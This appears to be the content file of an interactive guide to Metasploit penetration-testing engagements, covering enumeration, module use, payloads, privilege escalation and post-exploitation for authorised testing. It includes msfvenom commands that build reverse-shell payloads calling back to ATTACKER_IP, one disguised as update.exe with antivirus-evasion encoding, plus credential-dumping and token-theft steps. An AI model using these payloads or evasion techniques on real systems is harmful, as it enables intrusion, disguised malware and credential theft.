title: Metasploit engagement structure
intro: How a Metasploit engagement fits together: enumerate, prepare, exploit, escalate, then post-exploitation, and round again for the next target. Open any node for what it means and the msfconsole commands behind it, or walk the module workflow step by step. Use it only against systems you are authorised to test.

phases.name: Enumeration
phases.blurb: Find out exactly what is running, and which version, before you reach for a module.

nodes.label: Workspace & database
nodes.detail: msfconsole backs onto a PostgreSQL database that keeps your results, so hosts, services, credentials and loot survive across a long engagement and feed straight into modules. Start it once with msfdb init and check it with db_status. help database lists the commands.

children.label: Workspaces
children.detail: Workspaces are folders for the database: keep each target, subnet or client apart. workspace lists them (* marks the current one), -a adds and switches, -d deletes, workspace <name> switches.

children.label: Import & scan
children.detail: Pull scan results into the workspace, or scan from the console so the output is recorded. db_import reads a file (Nmap .xml is preferred); db_nmap runs Nmap and stores it. hosts and services then list what was found.

children.label: Hosts & services
children.detail: The hosts and services tables fill automatically from scans and interactions, and take manual entries too. Both filter and reshape their columns; -R sets RHOSTS straight from the rows you have selected, so the database drives the next module.

children.label: Credentials & loot
children.detail: creds lists the usernames, passwords and hashes gathered, with add to record your own and -o to export in John or hashcat format. loot holds dumped files, such as SAM hashes, passwd and shadow.

children.label: Export (backup)
children.detail: db_export writes the workspace to a file (xml or pwdump), so a PostgreSQL mishap does not cost your findings; db_import reads it back.

nodes.label: Service validation
nodes.detail: Confirm each service and its version. Passive sources first, then active scanning; Metasploit can store the results in its database so later modules pick them up.

children.label: Passive scanning
children.detail: Learn about the target without sending it anything unusual.

children.label: OSINT
children.detail: Public sources: the organisation's sites, job adverts that name their stack, code repositories, certificate transparency logs.

children.label: Interacting with services legitimately
children.detail: Use the service as an ordinary visitor would: browse the site, read banners and error pages, note versions the service volunteers.

children.label: whois / DNS records
children.detail: Registrant and netblock owners from whois; hosts, mail servers and subdomains from DNS records.

children.label: Active scanning
children.detail: Probe the target directly to fingerprint services and versions.

children.label: Nmap / Nessus / Nexpose scans
children.detail: Port and version scans. Run Nmap from inside msfconsole with db_nmap and the hosts and services land in the workspace database.

children.label: Web service identification tools
children.detail: Fingerprint web servers, frameworks and CMS versions (headers, default files, favicons).

children.label: Built-with identification tools
children.detail: Technology profilers that list the libraries, plugins and hosting behind a site.

nodes.label: Vulnerability research
nodes.detail: Match each product and version to known vulnerabilities, then find the module that covers it. The research sources feed the first two steps of the module workflow: search, then use.

children.label: VulnDB (GUI)
children.detail: Vulnerability database: look up the product and version for known issues.

children.label: Rapid7 (GUI)
children.detail: Rapid7's vulnerability and module database: each entry names the Metasploit module that covers it.

children.label: SearchSploit (CLI)
children.detail: Offline search of the Exploit-DB archive from the terminal.

children.label: Google Dorking (GUI)
children.detail: Targeted search operators to find advisories, write-ups and proof-of-concept code for the version you found.

children.label: Module anatomy
children.detail: Every module path reads <no.> <type>/<os>/<service>/<name>, e.g. 794 exploit/windows/ftp/scriptftp_list. No. is the index from your last search (use it instead of typing the path); type is what the module does; os is the target platform and architecture; service is the vulnerable service (or a general action like gather for a collection module); name is the specific action.

children.label: Module types
children.detail: The type is the first split between modules. Only Auxiliary, Exploit and Post are interactable with use; the rest support those. Auxiliary: scanning, fuzzing, sniffing, admin. Encoders: keep a payload intact to its destination. Exploits: abuse a vulnerability to deliver a payload. NOPs: keep payload sizes consistent across attempts. Payloads: the code that runs on the target and calls back. Plugins: extra scripts loaded into the console. Post: collect, pivot and escalate once you hold a session.

children.label: search [vuln. name]
children.detail: Search the module library. Bare text matches names and descriptions; keywords narrow it, and a leading - excludes. Useful keywords: cve:, type: (exploit/auxiliary/post/payload/encoder/nop/evasion), platform:, port:, rank: (e.g. excellent, or gte400), name:, author:, cve:, edb:, check: (has a check method). -S filters by regex, -s <column> sorts, -u uses the module if there is exactly one result.
cmd: msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

children.label: use [index no.]
children.detail: Select a module by its index number from the last search, or by its full path. info prints the targets, required options, references, rank and whether a check method is supported, so read it before firing. The prompt changes to name the module you are in.

phases.name: Preparation
phases.blurb: Make sure the module is the right one, and that it will work, before it touches the target.

nodes.label: Code auditing
nodes.detail: Read the module or exploit source. Know what it sends, what it changes on the target, and whether it can crash the service.

nodes.label: Dependency check
nodes.detail: Confirm the module's requirements: the exact target version, the gems or libraries it needs, and any service state it assumes.

nodes.label: Importing custom modules
nodes.detail: A module not in the official release goes in by hand. Find Metasploit-format exploits on Exploit-DB (filter by the Metasploit Framework tag) or with searchsploit; the .rb files marked (Metasploit) are the ones msfconsole can run, so not every .rb qualifies. Drop it under ~/.msf4/modules (or /usr/share/metasploit-framework/modules) in the matching folder structure, making the folders if they are missing. Name it snake_case with underscores, not dashes, or it errors. Then reload_all, or loadpath <dir>, and search or use it.

nodes.label: Porting & writing modules
nodes.detail: To turn a Python or PHP exploit into a module, or write one from scratch, you work in Ruby (hard tabs). Do not start blank: copy an existing module from the same category and reuse it as boilerplate. The include lines at the top are mixins, shared classes such as Msf::Exploit::Remote::HttpClient that hand you ready methods; pick the ones your exploit needs from the Metasploit documentation. The initialize block holds the name, description, author, references (CVE), platform, arch and targets; register_options declares what the user sets, like RHOSTS and TARGETURI. Keep custom modules tidy so you and the next tester can find them.

nodes.label: Plugins
nodes.detail: Plugins pull an outside tool into msfconsole so its work lands in the same database and you stop juggling separate software. Nessus, Nexpose, Nmap, Mimikatz and others ship ready to load. load <name> starts one and adds its commands to the console. The .rb files live in /usr/share/metasploit-framework/plugins, so a custom plugin just drops in there. Mixins are the Ruby side of the same idea, shared code the framework is built from. Worth knowing the name, nothing to set.

phases.name: Exploitation
phases.blurb: Set the module's parameters, then run it.

nodes.label: Run module locally
nodes.detail: Try the module against a lab copy of the target first, where a crash costs nothing.

nodes.label: Set parameters
nodes.detail: Every module needs three things set: its options, a payload, and a target.

children.label: Options (show options)
children.detail: The module's settings, shown by show options (or options). Everything with Yes under the Required column must be set before it will run. set applies to this module only; setg sets a global value kept across modules until you restart, handy for RHOSTS and LHOST while you stay on one target. The payload has its own options block (LHOST, LPORT).

children.label: URI
children.detail: The path to the vulnerable application on a web server (often TARGETURI).

children.label: Proxies
children.detail: Send the module's traffic through a proxy chain.

children.label: RHOST / RPORT
children.detail: The target address (RHOSTS) and service port (RPORT).

children.label: Usernames
children.detail: A single username or a file of them, for modules that log in.

children.label: Passwords
children.detail: A single password or a file of them.

children.label: Dictionaries
children.detail: Wordlists for login and brute-force modules (USER_FILE, PASS_FILE, USERPASS_FILE).

children.label: Session
children.detail: An existing session to run through: post and local modules act on a session you already hold.

children.label: Payloads (show payloads)
children.detail: The code sent with the exploit that runs on the target, usually to return a shell: the exploit's job is to land it, the payload's job is to connect back. Run from inside an exploit module, show payloads lists only the ones that fit (msfconsole has already filtered to the target OS and arch), and set payload <no.> selects one, which adds its own options (LHOST, LPORT). The list is long, so filter with grep; ifconfig prints your LHOST without leaving the console.
cmd: msf6 exploit(...) > grep meterpreter grep reverse_tcp show payloads

children.label: Singles, stagers, stages
children.detail: Three payload builds. A single carries the exploit and the whole task in one; self-contained and stable, but large, and some exploits cannot fit it. A staged payload splits the work: a small, reliable stager (Stage0) runs first and opens the connection back (reverse_tcp, reverse_https, bind_tcp), then pulls a larger stage (Stage1) with no size limit, like Meterpreter or VNC. A / in the payload name marks a staged pair: windows/shell_bind_tcp is a single, windows/shell/bind_tcp is stager + stage. Metasploit picks the stager for you.

children.label: Meterpreter
children.detail: The multi-purpose stage. Injected as a DLL and run entirely in memory, leaving nothing on disk, so it is hard to spot with ordinary forensics; extensions load and unload on the fly. Its own prompt takes Linux-style commands, not Windows ones: getuid, not whoami. From it: hashdump, screenshot, keyscan, getsystem, migrate, and shell to drop into a real cmd.exe on the host.

children.label: Shell binds
children.detail: The target opens a listening port and you connect in. Needs that port reachable from you, so it fails behind inbound filtering; reverse shells are usually preferred.

children.label: Reverse shells
children.detail: The target dials back to your listener (LHOST/LPORT). It rides outbound traffic, which firewalls trust more than inbound, so it works through most NAT and filtering. Still watched, so tread carefully.

children.label: EXE
children.detail: A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler. Beyond Metasploit's own payloads, frameworks like Empire and Cobalt Strike cover the same ground on real engagements.

children.label: msfvenom (standalone payloads)
children.detail: msfvenom builds a payload as a standalone file, outside an exploit, for when you deliver it yourself: an upload, a writable share, a phishing lure. It is msfpayload and msfencode in one. Pick the payload with -p, the output format with -f (exe, aspx, elf, raw, or a scripting language), set LHOST and LPORT, and write it with -o. Catch the callback with exploit/multi/handler set to the same payload, LHOST and LPORT.
cmd: msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f aspx -o shell.aspx

children.label: Encoders
children.detail: Rework a payload's bytes to make it compatible: fit a processor architecture (x86, x64, sparc, ppc, mips) and strip bad characters, such as the null byte, that would break the exploit. show encoders inside a module lists only the ones that fit the current payload. x86/shikata_ga_nai (a polymorphic XOR scheme) was once the go-to for evasion, but modern detection has caught up: encoding alone, even over many -i iterations, rarely gets a payload past antivirus now, so treat encoders as a compatibility tool, not an evasion one. Before 2015 this was msfpayload | msfencode; both are folded into msfvenom. Check a build with msf-virustotal (needs a VirusTotal API key).
cmd: msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

children.label: AV & IDS/IPS evasion
children.detail: Defences split in two: endpoint protection (antivirus on the host) and perimeter protection (firewall, IDS/IPS at the network edge, often with a DMZ between inside and outside). Signature detection matches known byte patterns; heuristic and behavioural detection flag anything that strays from normal, so a plain payload, or even the callback itself, can trip an alarm. msfconsole v6 tunnels Meterpreter over AES, which handles most network inspection, but the file still sits on disk before it runs and can be fingerprinted there, so encoding alone will not hide it. Stronger moves: embed the payload in a real executable with a template (-x) and run it in a separate thread (-k) so the host program still opens normally, or wrap the file in a password-protected archive the scanner cannot read (it may still flag the archive as unscannable). Packers (UPX, Themida and others) compress and reshape the executable for another layer. For exploit code, randomise buffers and avoid obvious NOP sleds, which IDS/IPS watch for. Authorised testing only, and test in a lab first: you may get one attempt on the client.
cmd: msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -x template.exe -k -e x86/shikata_ga_nai -i 5 -f exe -o update.exe

children.label: Targets (show targets)
children.detail: The operating system and version the exploit is tuned for. Many modules default to automatic; pick one explicitly when you know the target.

children.label: Linux
children.detail: Linux targets, often split by distribution or architecture.

children.label: Windows
children.detail: Windows targets, often split by version and service pack.

children.label: macOS
children.detail: macOS targets.

children.label: Others
children.detail: Everything else the module supports: BSD, appliances, embedded firmware.

nodes.label: Run
nodes.detail: check first where the module supports it, then fire. run reports the handler starting, confirms the target is vulnerable, and opens a session when it works. Drop to a shell from a Meterpreter session, or use run -j to run it as a background job. A failed exploit means the module did not work, not that the vulnerability is gone. Many need tuning to the target, so treat the framework as a tool that backs up your manual skills, not one that replaces them.

nodes.label: Sessions & jobs
nodes.detail: A session is your control channel to one compromised host, and msfconsole holds several at once. Background the current one with background (or Ctrl+Z) and the connection stays up while you load another module, then sessions -i <no.> drops you back in. Point a post or local module at a backgrounded session with set SESSION <no.>. A job is a module running in the background, such as a handler holding a port. exploit -j starts one, jobs -l lists them, and kill <no.> or jobs -K frees the port without tearing down your sessions.

phases.name: Privilege escalation
phases.blurb: From the foothold, work up to the highest privilege on the host.

nodes.label: Vulnerability research
nodes.detail: Enumerate the host from the session and map it to local exploits, which run as local modules against that session.

nodes.label: Credential gathering
nodes.detail: Passwords and hashes found on the host can lead to a more privileged account.

nodes.label: Token impersonation
nodes.detail: On Windows, a process may hold access tokens of other, more privileged users that the session can take on.

next.label: Return to Enumeration, repeat until highest privilege obtained

phases.name: Post-exploitation
phases.blurb: Use the access you have: reach further, gather what the engagement asks for, and leave nothing behind.

nodes.label: Meterpreter
nodes.detail: Meterpreter is the post-exploitation shell you get from a Meterpreter payload. It lives in memory, writes nothing to disk, injects into a process that is already running rather than starting its own, and talks back over AES, so it leaves little for forensics to find. It works like a normal shell with extra built-in commands, grouped under help (core, filesystem, networking, system, user interface, webcam, privilege). From one session you can enumerate the host, move process, escalate, dump credentials and pivot without reaching for another tool.

children.label: Look around
children.detail: Find out who you are and what is running before you act. getuid is who the session runs as, sysinfo is the OS and domain, ps is the process list with each one's user and architecture.

children.label: Move process & steal tokens
children.detail: migrate moves the session into another, more stable process, which also shifts the user you run as. On Windows, steal_token <pid> takes the access token of a process owned by a more privileged user, so getuid then shows that account.

children.label: Escalate
children.detail: getsystem tries the built-in routes to SYSTEM. If it fails, background the session and run the local exploit suggester to map the host to local exploits, then run one against the SESSION.

children.label: Dump credentials
children.detail: As SYSTEM, pull the hashes. hashdump reads the local SAM; load kiwi brings in Mimikatz; lsa_dump_sam and lsa_dump_secrets pull the SAM and the LSA secrets (service accounts, cached logins). Feed what you get to cracking or pass-the-hash.

children.label: Drop to a shell
children.detail: shell opens a native cmd.exe or /bin/sh on the host, at the same privilege as the session. background (or bg) keeps the session alive and returns you to msfconsole.

nodes.label: Pivoting to other systems
nodes.detail: Route traffic through the session to networks only the compromised host can reach.

nodes.label: Credential gathering
nodes.detail: Collect credentials for lateral movement. Record where each one came from.

nodes.label: Data exfiltration
nodes.detail: Show impact by retrieving the data the scope names, and only that.

nodes.label: Cleanup
nodes.detail: Remove every file, account, service and route you added, and log what you removed, so the client is left as you found it.

workflow.title: Search for a module
workflow.text: Search the module library for the vulnerability you found.

workflow.title: Use it
workflow.text: Select the module by its index number, and read info.

workflow.title: Set options
workflow.text: show options, then set each required option, such as RHOSTS.

workflow.title: Set the payload
workflow.text: show payloads, then set one that fits your listener and the target's architecture.

workflow.title: Set the target
workflow.text: show targets, then set the one matching the operating system and version.

workflow.title: Run
workflow.text: check if the module supports it, then run.
